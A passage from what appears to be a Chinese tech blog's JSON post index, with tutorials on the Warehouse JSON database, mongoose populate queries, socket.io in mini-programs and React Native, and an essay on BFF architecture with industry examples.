实现的，有着与 Mongodb 几乎 90% 的接口函数。可以把它看成一个 min 的 Mongodb。 安装： 1yarn add warehouse","text":"前言Warehouse 是一个轻量级的 JSON 本地存储数据库。它与 LowDB 不同的是，Warehouse 不是基于 lodash 实现的，它的 API 是根据 Mongodb 的 API 实现的，有着与 Mongodb 几乎 90% 的接口函数。可以把它看成一个 min 的 Mongodb。 安装： 1yarn add warehouse 基本使用正如你所见 Warehouse 的 API 几乎与 Mongodb 一致。如果你会使用 Mongodb，那么 Warehouse 基本也会使用了。 12345678910111213const Database = require('warehouse');const db = new Database();const Post = db.model('posts', &#123; title: String, created: &#123; type: Date, default: Date.now &#125;&#125;);Post.insert(&#123; title: 'Hello world'&#125;).then(post =&gt; &#123; console.log(post);&#125;); 加载由于文档写着真是非常不清楚，摸了好久才知道。 Warehouse 的加载模式是需要自己手动指定的。 123456789const db = new Database();db.options = &#123; version: 1.0, path: './db.json',&#125;;db.load(); // 从 json 里加载数据db.save(); // 保存数据到 json 里 说明： 需要先指定加载的 json 文件路径。 指定完成后需要调用 load 完成加载。 注意，任何的 CURD 操作都是内存级别的操作，因此需要自己手动调用 db.save 来同步到本地的 json 文件里。 如果不使用 db.load 和 db.save，那么 warehouse 可以说是一个内存数据库了。 模型定义模型类似 Mongoose，甚至还提供了 populate 等操作。 123456789101112131415161718const ID = db.Schema.Types.CUID;const User = db.model('user', &#123; name: String, age: Number,&#125;);const Post = db.model('post', &#123; title: String, created: &#123; type: Date, default: Date.now, &#125;, userId: &#123; type: ID, ref: 'user', &#125;,&#125;); CURD 操作创建数据创建数据有两种方式： 使用 .insert() / .insertOne()。 使用 .new()，接着使用 .save()。 123456// 1.User.insert(&#123; name: '小明', age: 20 &#125;);// 2.const user = User.new(&#123; name: '小明', age: 20 &#125;);user.save(); 查询数据比较常用的是 find，findOne，findById 函数，这些函数都要有参数。 1234const posts = await Post.find(&#123;&#125;).populate('userId');console.log(posts);console.log(posts.first().toObject()); 说明： find 之后是有链式调用的，也有 limit，skip，sort 等操作函数。 find 返回的是 Query 对象，需要使用 toArray 转成数组。 findOne 返回的是 Document 对象，需要使用 toObject 转成对象。 使用 populate 可实现关联性查询，比较坑爹的是 populate 返回的仍然是 Document 对象。 更新数据更新数据使用两个 api：update 和 updateById。这些 api 可以在 Model、Query、Document 对象上使用。 1const res = await Post.updateById(posts._id, &#123; title: '小妹妹' &#125;); 更新成功后返回更新的数据对象（不是 Document）。 此外还有两个比较特别的 api：replace 和 replaceById。 1const res = await User.replaceById(user._id, &#123; name: '小妹妹', age: 21 &#125;); 这两个可以认为是完全更新的 api，因为 update 不会完全覆盖。 删除数据删除数据使用两个 api：remove 和 removeById。这些 api 可以在 Model、Query、Document 对象上使用。 1const res = await Post.removeById(posts._id); 删除成功后返回删除的数据对象（不是 Document）。 常见对象三大对象：Model、Query、Document。 Model 对象Model 对象在定义模型之后得到。 Model 具有的函数： API 返回 说明 count Number 返回当前集合的元素个数。 destroy Any 未知。 eq Document 返回指定索引处的文档，索引可以为正数或负数。 find Query 查询数据。 findById Document 查询数据。 findOne Document 查询数据。 first Document 返回首数据。 last Document 返回尾数据。 has Boolean 判断是否有某数据。 insert Promise 插入数据。 insertOne Promise 插入数据。 filter Query 类似数组的 filter 函数。 forEach void 类似数组的 forEach 函数。 every Boolean 类似数组的 every 函数。 map Query 类似数组的 map 函数。 reduce Query 类似数组的 reduce 函数。 reduceRight Query 类似数组的 reduceRight 函数。 slice Query 类似数组的 slice 函数。 some Boolean 类似数组的 some 函数。 new Document 创建一个新的文档。 populate Document 实现关联查询。 remove Promise 删除数据。 removeById Promise 删除数据。 replace Promise 替换数据。 replaceById Promise 替换数据。 reverse Query 返回一个反转过的文档列表。 save Promise 保存数据。 shuffle Query 返回一个打乱过的文档列表。 limit Query 返回指定数量的元素。 skip Query 跳过多少个元素。 sort Query 对元素进行排序。 toArray Array 转换成真正的数组。 update Promise 更新数据。 updateById Promise 更新数据。 Query 对象Query 对象实际上是一个数列，在使用 find 查询时出现，可以使用 toArray 转成数组。 Query 具有的函数： API 返回 说明 count Number 返回当前数列的个数。 eq Document 返回指定索引处的文档，索引可以为正数或负数。 every Boolean 类似数组的 every 函数。 filter Query 类似数组的 filter 函数。 forEach void 类似数组的 forEach 函数。 map Query 类似数组的 map 函数。 reduce Query 类似数组的 reduce 函数。 reduceRight Query 类似数组的 reduceRight 函数。 slice Query 类似数组的 slice 函数。 some boolean 类似数组的 some 函数。 find Query 在此数列里查询。 findOne Document 在此数列里查询一个。 first Document 返回数列的首元素。 last Document 返回数列的尾元素。 populate Query 返回指定关联的元素。 remove Promise 清除当前数列的全部文档。 replace Promise 替换当前数列的全部文档。 reverse Query 反转当前数列。 shuffle Query 打乱当前数列（随机位置交换）。 limit Query 返回指定数量的元素。 skip Query 跳过多少个元素。 sort Query 对元素进行排序。 toArray Array 转换成真正的数组。 update Promise 更新数列。 Document 对象Document 对象在就是单个文档。 Document 对象有以下函数： API 返回 说明 populate Document 实现关联查询。 remove Document 从 db 里删除文档。 replace Document 从 db 里替换文档。 save Promise 保存文档。 toObject Object 转成对象。 toString String 转成字符串。 update Document 更新文档。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"MongoDB 实现关联查询","slug":"MongoDB/MongoDB 实现关联查询","date":"2019-08-16T08:34:55.000Z","updated":"2021-06-15T06:10:52.826Z","comments":true,"path":"/stories/2019/08/MongoDB/MongoDB 实现关联查询/","link":"","permalink":"http://me.lizhooh.com/stories/2019/08/MongoDB/MongoDB 实现关联查询/","excerpt":"前言实际上是 mongoose 实现关联查询。 数据表定义为演示关联查询，这里准备了 4 个表（文档），分别是日志表，用户表，账号表，权限角色表。每个表之间都是依赖 id 来进行关联查询。 账号表： 12345type Account = &#123; id: ID, account: string, password: string,&#125;","text":"前言实际上是 mongoose 实现关联查询。 数据表定义为演示关联查询，这里准备了 4 个表（文档），分别是日志表，用户表，账号表，权限角色表。每个表之间都是依赖 id 来进行关联查询。 账号表： 12345type Account = &#123; id: ID, account: string, password: string,&#125; 权限角色表： 12345type Role = &#123; id: ID, name: string, level: number,&#125; 用户表： 123456789type User = &#123; id: ID, roleId: ID, accountId: ID, name: string, age: number, avatar: string, address: string,&#125; 日志表： 1234567type Logger = &#123; id: ID, uid: ID, action: string, log: string, level: number,&#125; 这是比较常规的数据表定义，用了 mongoose 时会有些不同。 数据模型12345678910111213141516171819202122232425262728293031323334353637const ID = mongoose.Schema.Types.ObjectId;const Account = mongoose.model('account', &#123; account: String, password: String,&#125;);const Role = mongoose.model('role', &#123; name: String, level: Number,&#125;);const User = mongoose.model('user', &#123; account: &#123; type: ID, ref: 'account', &#125;, role: &#123; type: ID, ref: 'role', &#125;, name: String, age: Number, avatar: String, address: String,&#125;);const Logger = mongoose.model('logger', &#123; action: String, log: String, level: Number, user: &#123; type: ID, ref: 'user', &#125;,&#125;); 说明： 在这里通过 ref 来实现 id 的引用关系。 这是实现关联查询的第一步。 注入数据这段代码跑三次，插入 3 份数据。 123456789101112131415161718192021// 插入模拟数据+ async function () &#123; const account = new Account(&#123; account: 'admin', password: 'abc123' &#125;); const res1 = await account.save(); const role = new Role(&#123; name: '超级管理员', level: 1 &#125;); const res2 = await role.save(); const user = new User(&#123; account: res1, role: res2, name: '小明 - ' + Math.random().toString(32).slice(2), age: 20, avatar: 'https://img2.woyaogexing.com/2019/08/16/e7f09588c9cd4ee19432f90d636c555d!400x400.jpeg', address: '广东省中山市石岐区富源路 13 号', &#125;); const res3 = await user.save(); const logger = new Logger(&#123; action: '常规操作', log: '默认', level: 1, user: res3 &#125;); const res4 = await logger.save();&#125; (); 关联查询在模型里有了引用关系，就可以使用 populate 来实现关联查询。 123456789101112// 关联查询+ async function () &#123; const user = await User .find(&#123; age: 20 &#125;) .populate('account') .populate('role') .limit(2) .exec(); console.log(user); process.exit(1);&#125; (); 查询结果： 1234567891011121314151617181920212223242526272829303132[ &#123; _id: 5d56760fcc718f2550304086, account: &#123; _id: 5d56760ecc718f2550304084, account: 'admin', password: 'abc123', __v: 0 &#125;, role: &#123; _id: 5d56760fcc718f2550304085, name: '超级管理员', level: 1, __v: 0 &#125;, name: '小明 - 5hgjj850l08', age: 20, avatar: 'https://img2.woyaogexing.com/2019/08/16/e7f09588c9cd4ee19432f90d636c555d!400x400.jpeg', address: '广东省中山市石岐区富源路 13 号', __v: 0 &#125;, &#123; _id: 5d56761267cfd7034853c176, account: &#123; _id: 5d56761167cfd7034853c174, account: 'admin', password: 'abc123', __v: 0 &#125;, role: &#123; _id: 5d56761267cfd7034853c175, name: '超级管理员', level: 1, __v: 0 &#125;, name: '小明 - ib4uajcel1g', age: 20, avatar: 'https://img2.woyaogexing.com/2019/08/16/e7f09588c9cd4ee19432f90d636c555d!400x400.jpeg', address: '广东省中山市石岐区富源路 13 号', __v: 0 &#125;] 好这这样就实现了简单的关联查询。 Populate APIpopulate 可以多次调用，每一次调用都是一个关联。 populate 的第一个参数有多个值，默认是关联的模型名称，第二个参数有多个值，默认是选择显示的字段，如果是忽略字段则是 - 开始。 12// 先显示 account 和 password 字段，并且忽略 _idpopulate('account', 'account password -_id') 如果第一个参数是对象，那么就是配置对象： 123456populate(&#123; path: 'fans', // 关联的模型 match: &#123; age: &#123; $gte: 21 &#125;&#125;, // 过滤条件 select: 'name -_id', // 显示的字段 options: &#123; limit: 5 &#125;, // 配置项&#125;) 如果是多级别的关联这样写： 123456789101112131415161718const Resume = model('resume', new Schema(&#123; jobStatus: &#123; type: ID, ref: 'label', &#125;, jobIntension: [&#123; job: &#123; type: ID, ref: 'label', &#125;, city: String, salary: [Number], industry: &#123; type: ID, ref: 'label', &#125;, &#125;],)); 注意中间的点。 123.populate('jobStatus').populate('jobIntension.job').populate('jobIntension.industry') 如果存在多级的关联，可以这样写： 1234populate(&#123; path: 'friends', populate: &#123; path: 'friends' &#125;&#125;); 两个数据库之间进行关联也没问题： 12345678910const db1 = mongoose.createConnection('localhost:27000/db1');const db2 = mongoose.createConnection('localhost:27001/db2');const Event = db1.model('Event', eventSchema);const Conversation = db2.model('Conversation', conversationSchema);cosnt res = await Event .find() .populate(&#123; path: 'conversation', model: Conversation &#125;) .exec(); 只需要在配置里指定模型即可。 小结实现关联查询的关键在于，模型的引用定义，populate 的使用。 参考资料 https://liangtongzhuo.com/atricle.html?58dde87844d904006d03e62c https://my.oschina.net/calvinchen/blog/137932","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"小程序实时应用解决方案","slug":"小程序/小程序实时应用解决方案","date":"2019-08-11T11:03:15.000Z","updated":"2021-06-15T06:10:52.913Z","comments":true,"path":"/stories/2019/08/小程序/小程序实时应用解决方案/","link":"","permalink":"http://me.lizhooh.com/stories/2019/08/小程序/小程序实时应用解决方案/","excerpt":"前言小程序为我们提供了 websocket 的接口，因此可以利用 socket.io 来做实时应用。为什么是 socket.io？socket.io 为我们封装了很多功能，非常适合做单一聊天，群聊的功能。 socket.io 官方没有提供小程序的版本，有一个 weapp.socket.io 的库提供了小程序版的 socket.io 适配，主要是去除了 ajax 轮询的功能和一些 buffer 的功能，因为小程序没有这些 api。","text":"前言小程序为我们提供了 websocket 的接口，因此可以利用 socket.io 来做实时应用。为什么是 socket.io？socket.io 为我们封装了很多功能，非常适合做单一聊天，群聊的功能。 socket.io 官方没有提供小程序的版本，有一个 weapp.socket.io 的库提供了小程序版的 socket.io 适配，主要是去除了 ajax 轮询的功能和一些 buffer 的功能，因为小程序没有这些 api。 客户端首先安装： 1yarn add weapp.socket.io 使用方式和 socket.io 的客户端代码一样。 123456789import io from 'weapp.socket.io';const socket = io('http://127.0.0.1:3000');socket.on('news', d =&gt; &#123; console.log('received news: ', d);&#125;);socket.emit('news', &#123; title: 'this is a news' &#125;); 服务端服务端的代码非常简单。 123456789101112131415161718192021const app = require('express')();const http = require('http').createServer(app);const io = require('socket.io')(http);app.get('/', (req, res) =&gt; &#123; res.send(&#123; text: 'hello' &#125;);&#125;);io.on('connection', (socket) =&gt; &#123; console.log('a user connected'); socket.on('news', data =&gt; &#123; console.log(data); socket.emit('news', &#123; text: 'ok' &#125;); &#125;);&#125;);http.listen(3000, () =&gt; &#123; console.log('listening on *:3000');&#125;); 先这样吧，有空补上单聊和群聊的功能实现。","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"React Native + Socket.io 开发实时应用","slug":"React Native/Socket/React Native + Socket.io 开发实时应用","date":"2019-08-11T07:58:46.000Z","updated":"2021-06-15T06:10:52.869Z","comments":true,"path":"/stories/2019/08/React Native/Socket/React Native + Socket.io 开发实时应用/","link":"","permalink":"http://me.lizhooh.com/stories/2019/08/React Native/Socket/React Native + Socket.io 开发实时应用/","excerpt":"前言接入 Socket.io在 React Native 上接入 Socket.io 有些 BUG，因此需要特定的版本。 具体看这篇文章，主要表现为无法连接：https://github.com/socketio/socket.io-client/issues/1245","text":"前言接入 Socket.io在 React Native 上接入 Socket.io 有些 BUG，因此需要特定的版本。 具体看这篇文章，主要表现为无法连接：https://github.com/socketio/socket.io-client/issues/1245 1yarn add socket.io-client@2.1.1 客户端需要使用 socket.io-client 并且限定了版本为 2.1.1。亲测，在 React Native 0.61.2 版本里，可以连接成功，下面是客户端的示例代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import React, &#123; Component &#125; from 'react';import &#123; View, Text, StatusBar,&#125; from 'react-native';import day from 'dayjs';import io from 'socket.io-client';// 开发时，这里不能填写 127.0.0.1const socket = io.connect('ws://192.168.1.198:3000', &#123; path: '/test', // 一定要写 reconnection: true, // 重新连接 reconnectionDelay: 1000, // 连接间隔 reconnectionAttempts: Infinity, // 连接次数 jsonp: false, transports: ['websocket'],&#125;);export default class App extends Component &#123; state = &#123; list: [], &#125; componentDidMount() &#123; socket.on('connect', () =&gt; this.push('已连接')); socket.on('error', () =&gt; this.push('断开连接')); socket.on('connect_error', () =&gt; this.push('尝试重新连接')); socket.on('news', data =&gt; &#123; this.push(data.title); &#125;); &#125; push(str) &#123; const &#123; list &#125; = this.state; list.push(day().format('hh:mm:ss') + ' ' + str); this.setState(&#123; list &#125;); &#125; render() &#123; const &#123; list &#125; = this.state; const style = &#123; backgroundColor: '#787878', paddingTop: 25, flex: 1, &#125;; return ( &lt;View style=&#123;style&#125;&gt; &lt;StatusBar translucent=&#123;true&#125; backgroundColor='rgba(1, 1, 1, 0)' barStyle='light-content' /&gt; &#123;list.map((item, index) =&gt; ( &lt;View key=&#123;index&#125; style=&#123;&#123; padding: 12, paddingBottom: 0 &#125;&#125;&gt; &lt;Text&gt;&#123;item&#125;&lt;/Text&gt; &lt;/View&gt; ))&#125; &lt;/View&gt; ); &#125;&#125; 下面是服务端的简单代码： 1234567891011121314151617181920const express = require('express');const app = express();const server = require('http').createServer(app);app.get('/', (req, res) =&gt; &#123; res.sendFile(__dirname + '/index.html');&#125;);const io = require('socket.io')(server, &#123; path: '/test',&#125;);io.on('connection', (socket) =&gt; &#123; console.log('a user connected'); socket.emit('news', &#123; title: '欢迎你' &#125;);&#125;);// 这里不能用 app.listenserver.listen(3000);","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"谈谈 BFF 技术架构","slug":"前端/谈谈 BFF 技术架构","date":"2019-08-10T02:08:40.000Z","updated":"2021-06-15T06:10:52.907Z","comments":true,"path":"/stories/2019/08/前端/谈谈 BFF 技术架构/","link":"","permalink":"http://me.lizhooh.com/stories/2019/08/前端/谈谈 BFF 技术架构/","excerpt":"前言随着互联网产品多终端，多平台，多业务状态，多角色等方面的发展，前后端数据交互越发越复杂。可能面临的是同一份数据，在不同的终端（Web/PC/Android/iOS/小程序等）上以不同的形态和结构，在多种场景下被消费。 在前端开发中普遍存在的难问题： 多端应用，不同类型客户端对数据、API 有个性化的需求。 后端提供的接口数据，难以一次性的支撑单个 UI 渲染。 服务聚合，单一后端为多个前端团队提供接口，导致跨团队协作低效，资源协调困难。 问题：服务端（后端）设计的接口究竟是面向 UI，还是面向通用服务？ 实际上，后端往往不会专注于关心前端 UI 的数据展示结构，而是细分的服务化接口。前端更多在需要每个端里自行组合、过滤、转换后端提供的接口数据，才能足以支撑 UI 的渲染。","text":"前言随着互联网产品多终端，多平台，多业务状态，多角色等方面的发展，前后端数据交互越发越复杂。可能面临的是同一份数据，在不同的终端（Web/PC/Android/iOS/小程序等）上以不同的形态和结构，在多种场景下被消费。 在前端开发中普遍存在的难问题： 多端应用，不同类型客户端对数据、API 有个性化的需求。 后端提供的接口数据，难以一次性的支撑单个 UI 渲染。 服务聚合，单一后端为多个前端团队提供接口，导致跨团队协作低效，资源协调困难。 问题：服务端（后端）设计的接口究竟是面向 UI，还是面向通用服务？ 实际上，后端往往不会专注于关心前端 UI 的数据展示结构，而是细分的服务化接口。前端更多在需要每个端里自行组合、过滤、转换后端提供的接口数据，才能足以支撑 UI 的渲染。 本文讲述了，引出了 BFF 来解决这些问题。 BFF 介绍BFF，即 Backends For Frontends（服务于前端的后端），也就是服务器设计 API 时会考虑前端的使用，并在服务端直接进行业务逻辑的处理。BFF 也称为 数据适配层/数据中间层/用户体验适配层。 BFF 最适合的场景，为第三方提供定制 API 等差异化场景，每个用户体验（客户端）对应一个后端。这中后端更像是私人定制一样，能够最大程度的满足前端需要的数据结构要求。 在没有 BFF 的前后端架构在传统的前后端设计中，通常是 App 或者 Web 端直接访问后端服务，后台微服务之间相互调用，然后返回最终的结果给前端消费。对于客户端（特别是移动端）来说，过多的 HTTP 请求是很昂贵的，所以开发过程中，为了尽量减少请求的次数，前端一般会倾向于把有关联的数据通过一个 API 获取。在微服务模式下，意味着有时为了迎合客户端的需求，服务器常会做一些与 UI 有关的逻辑处理。 引入了 BFF 之后加入了 BFF 的前后端架构中，最大的区别就是前端（Mobile, Web）不再直接访问后端微服务，而是通过 BFF 层进行访问。并且每种客户端都会有一个BFF服务。从微服务的角度来看，有了 BFF 之后，微服务之间的相互调用更少了。这是因为一些UI的逻辑在 BFF 层进行了处理。 服务自治，谁使用谁开发BFF 的理念中，最重要的一点是：服务自治，谁使用谁开发，所以一般由前端团队开发与维护。BFF 实现不限制具体技术，可以自由选型：Java/Nodejs/PHP/Golang/Python，但大部分前端团队都会选择 Nodejs，原因是： Nodejs 是使用 Javascript 编写代码的，可以让前端工程师更加无缝的切入 BFF 的建设。 Nodejs 天生的单线程异步机制，非常适合高并发的 IO 处理，在 v8 的光环下拥有不错的性能。 Javascript 拥有最好的 JSON 亲和性。 Javascript 的函数式编程，非常适合对数据的处理。 既然这样，那么 Javascript 弱类型的缺点是不是需要担心的？这个问题，我们可以使用 Typescript 取代 Javascript 来开发，Typescript 是一个具有强大的类型系统语言，同时也完全的兼容 Javascript 最新的语法。参考文章：TypeScript 成新宠，JavaScript 或将被取代 在 BFF 模式下：团队整体分工很清晰，后端通过 Java 等语言负责服务实现，理想情况下给前端提供的是基于领域模型的 RPC/HTTP 接口，前端则在 BFF 层直接调用服务端 RPC/HTTP 接口拿到数据，按需加工消费数据，并实现人机交互。 RPC 的指是：不在一个内存空间的两个应用，借助网络来实现，像调用本地的函数一样去调用远程函数。 基于 BFF 模式的研发，很适合拥有前端技术背景的全栈型工程师。这种模式的好处很明显，后端可以专注于业务领域，更多从领域模型的视角去思考问题，页面视角的数据则交给前端型全栈工程师去搞定。 领域模型与页面数据是两种思维模式，通过 BFF 可以很好地解耦开，让彼此更专业高效。 用户体验适配层BFF 作为用户体验适配层，主要有以下作用： 对后端接口进行：组合、处理、校验。 对后端提供的数据进行：裁剪、拼接、格式化、聚合、编排。 还有更多的可能： 代理：在开发环境下，我们可以利用代理来，解决最常见的跨域问题；在线上环境下，可以利用代理，转发请求到多个服务端。 缓存：缓存其实是更靠近前端的需求，用户的动作触发数据的更新，BFF 可以直接处理一部分缓存需求。 限流：BFF 可以针对接口或者路由做响应的限流。 日志：相比其他服务端语言，BFF 的日志记录，能更方便快捷的定位问题（在前端还是服务端）。 监控：擅长高并发的请求处理，做监控也是合适的选项。 测试：在 BFF 层做 RESTFul api 测试，保证接口的可靠性。 鉴权：有一个中间层去鉴权，也是一种单一职责的实现。 路由：前端更需要掌握页面路由的权限和逻辑。 服务端渲染：BFF（特指 Nodejs）的解决方案更灵活，比如 SSR、模板直出、页面做预渲染等。 BFF 演化历程BFF 和网关（API Gateway）是微服务架构中两个重要概念，可以通过下面的例子讲解 BFF 的演化历程。 服务化架构 V1实现单块应用的解构拆分，微服务初步完成，前端用户体验层主要是传统的服务端 Web 应用，服务化架构如下所示： 服务化架构 V2随着无线应用的流行，除了 Web 应用外，服务还需要为新的无线原生 App 来提供接口和数据，先采用下面的服务架构： 这样的架构的问题是： 无线 App 与内部为微服务强耦合。 无线 App 需要知道内部服务的地址等细节。 无线 App 需要对接口数据进行大量的聚合剪裁和适配逻辑。 为了解决这些问题，引出了 v2.1 版本，在用户体验层和内部微服务层之间引入了 BFF 层，将后端的微服务进行适配，想用户体验层暴露有号和统一的 API，方便无线设备接入访问后端服务。 这种架构解决了上面的问题： 无线 App 与内部为微服务解耦，两边可以独立变化。 无线 App 只需要知道 BFF 的地址，并且服务接口统一，不需要关心内部复杂的微服务的地址和细节。 无线 App 需要不再需要聚合剪裁和适配逻辑，这些步骤都在 BFF 完成。 但是随着接入终端的增加，也会有一些问题： BFF 只有一个，接入设备增加后导致要考虑匹配问题，团队之间沟通协调成本高。 BFF 中不仅包括了各个业务线的聚合剪裁、适配和业务逻辑，还需要引入很多跨横切面逻辑，比如安全认证、日志监控、限流熔断等，这些代码混在一起，导致代码复杂度提高。 BFF 如果出现错误，会导致所有应用都不可用。 微服务架构 V3为了解决 v2.1 产生的问题，在 v3 里引入 API Gateway（API 网关层）。 在这种架构下： BFF 按团队和业务线进行解耦拆分，拆分成若干个 BFF 微服务，每个业务线并行开发和交付各自负责的 BFF 微服务。 网关，一般由独立的团队负责运维，专注跨横切面的功能，包括： 路由：将来自无线设备的请求路由到后端的某个微服务 BFF 集群。 认证：对涉及敏感数据的 API 访问进行集中认证鉴权。 监控：对 API 调用进行性能监控。 限流熔断：网关能够进行限流熔断，保护后端服务。 安全防爬：收集访问日志，通过后台分析恶意行为，阻断恶意请求。 网关在客户端与 BFF 之间又引入了一层，让两边可以独立变化。 微服务架构 V4可以对 V3 架构进行优化，将传统的服务端 Web 应用模式改为前后分离架构，前端采用 SPA 单页技术提供给用户更好体验，同时增加了下手是哪个第三方应用开放 API 的能力。 拓展新的接入渠道，形成了一个完成的现代微服务架构，从外到内依次为：端用户体验层 -&gt; 网关层 -&gt; BFF 层 -&gt; 微服务层。 BFF 具体实现BFF 改变了传统的开发结构，在前后端之间引入了一个新的一层，在实现上有一定的难度。 细分力度要求把一个大后端拆分为多个小后端，有三种方式： 用户体验级（UI）。 平台或端级（Web/PC/Android/iOS/小程序等）。 团队级（不同的部门/群组）。 一般建议按照用户体验级来拆分。 对接下游服务 如何对接多个技术栈不同的下游服务（微服务）？ RPC/HTTP 协议调用。 如何管理、组合调用后端的服务？ 借助 RXJava、Finagle 等事件机制来简化这些异步流程控制。 使用服务发现，服务注册等技术，自动管理与组合。 某个调用失败时，如何保障可用性？ 在 BFF 层进行容错填充与检查，保障数据结构的完整性。 复用问题当终端多时，就会出现复用的问题： 拆分后，多个 BFF 间会产生冗余代码，这是不可避免的。 可以添加 API 网关层，将通用的后端逻辑（授权、认证、限流）放进去。 想消除冗余，又不想因为抽离可复用代码而导致 BFF 间紧耦合，所以就有了一种折衷的态度：容忍 BFF 间冗余、消除单 BFF 内冗余。 蚂蚁财富的 BFF 实践2016 年时，蚂蚁财富的汤尧对 BFF 在蚂蚁财富项目中的落地实践进行了介绍（相关演讲视频）。 在引入 BFF 之前，蚂蚁财富的业务也遇到了上面提到的问题，主要是体验层API经常变化，导致开发效率低下。于是引入了 BFF，主要的目的是对数据进行：裁剪、格式化、聚合、编排。 一个理想的模型如下： 在实际落地过程中，形成了如下的架构： 解决了的问题他们在实战过程中，主要解决了一下几个问题： 1. Nodejs 与 Java 通信 数据：跨语言序列化协议 hessian。 服务：Node弱类型，Java强类型，如何调用？主要是：配置 Jar 包依赖 -&gt; 安装类库 -&gt; 配置 Consumer -&gt; 开发业务代码。 2. 多 App 适配 在 API 网关层处理多个 App 的通用的逻辑，比如错误码管理、数据一致性、免登、业务日志等。 3. 数据聚合 传给客户端需要的数据，简化客户端逻辑，减少网络开销。 避免无意义的透传。 敏感信息过滤。 4. 接口设计准则 基础服务接口 细粒度。 通用的功能，可能会被多个BFF用到。 提供含各种状态的mock真实数据，易于同步开发（如何实现？）。 BFF API 设计 合理设计接口数量，太多不易维护。 提供含各种状态的 mock 真实数据，页面不依赖 server 开发。 多协议发布（如何实现？）。 规范数据格式。 5. 从技术角度来看 前端和 BFF 由同一人完成。 前端需要具备服务端技能（Nodejs、Nginx）。 快速的应用发布能力（Docker）。 TWA 的理念与实践在 2018 年的 SEE Conf，蚂蚁金服的不四（知乎 ID：死马）对在 BFF 基础上发展出来的 TWA（Techless Web Application）开发体系进行了介绍。（相关演讲视频）。 传统的分层，如下。 BFF 负责聚合底层业务数据，给客户端提供接口，秉承谁使用谁维护的理念，一般由前端团队维护。 业务实际上分为三层： 前端（React/ES6/Sass）。 BFF（Nodejs 接口聚合层）。 后端服务（Java）。 BFF on Chari 是蚂蚁自研的，基于 Eggjs 的 BFF 框架，打通了 Nodejs 到 Java 的 RPC 通信链路。Eggjs 已经开源（Eggjs 是以 Koa2 作为基础框架），可以基于 Eggjs 去打造属于自己的 BFF 框架。 BFF 不是银弹，有着自己的问题： 研发成本上升：前端团队既要开发客户端，又要开发 BFF，人手不够。 流程繁琐：BFF 引入后，要同时走前端、后端的研发流程，多端发布、互相依赖，流程繁琐。 运维经验不足：主要是前端工程师运维经验不足（给业务团队带来了很大困扰）。 尽管职责划分越来越清晰，但是由于前后端发布系统不一致，前端团队仍需要在基于不同的代码仓库进行研发，走不同的发布流程。 蚂蚁金服推出的解决方案 TWA（Techless Web Application），是一个全栈的研发框架。 TWA 是以提升开发者研发体验为核心的渐进式解决方案，给 H5 App 开发者 提供从框架、研发流程到运行时的完整支持。此处的 Techless 并不意味着它是一个没有技术含量的解决方案，而是我们期望让产品研发可以更好的关注在产品实现上，不用过于关注“应用”、“构建”、“部署”、“流程”等细节。 在 TWA 解决方案下，H5 App 的开发者只需要在一个代码仓库下，基于 TWA 提供的框架，完成客户端和 BFF 层的研发，通过 Basement 研发平台提供的流程支持，一键将应用部署到各个运行终端，同时在研发平台上完成应用的自助运维和监控。 BFF 下 Nodejs 与 Java 的通信与使用的微服务框架有关，可以采用 HTTP 的方式，也可以通过 RPC 调用。 蚂蚁金服的实践 - RPC 数据：跨语言序列化协议 hessian。 服务：Nodejs PRC。 开源框架： sofa-bolt-node：蚂蚁通讯协议 Bolt 的 Nodejs 实现。 sofa-rpc-node：一个通用的 Nodejs RPC 模块。 有赞的实践 - HTTP有赞的实践再 BFF 上使用了 Nodejs + Java + Tether 的结构。 在 Nodejs 和 Java 之间添加了一层中间代理层 Tether。Tether 是用 Go 语言写的一个本地代理，Tether 会对外暴露一个 HTTP 的服务，对Nodejs 来说，只需要通过 HTTP 方式调用本地的服务即可。其他服务化相关的服务发现、协议解析、负载均衡、长链建立维护都交由 Tether 来处理。 这样，Nodejs 这一层就非常轻量了，Nodejs 调用 Java 服务时： 123456789101112131415161718192021const Service = require('@/service/base/BaseService');class GoodsService extends Service &#123; /** * 根据商品 alias 获取商品详情 * @param &#123;String&#125; alias 商品 alias */ async getGoodsDetailByAlias(alias) &#123; const result = await this.invoke( // java 包 'com.youzan.ic.service.GoodsService', // 方法名 'getGoodsDetailByAlias', // 参数 [alias], ); return result; &#125;&#125;module.exports = GoodsService; 这种方式的优点： 使用简单，对前端开发非常友好，只需要通过 HTTP 方式调用本地的 Tether 服务即可。 多语言接入成本低，后期如果有其他语言（Python、Ruby）也需要接入整个服务化体系，也像 Nodejs 一样，它们都只需要调用本地 Tether 暴露的 HTTP 服务即可，没有额外的开发成本了。 后期更方便做协议层的优化，因为这种方式 Tether 其实就是一个代理，后期如果需要做协议层性能上的优化，那只需要优化 Tether 的性能就可以了。 当然也有缺点： 引入了 Tether 多一个服务，多一份运维成本。 技术实现难度比较高。 小结BFF 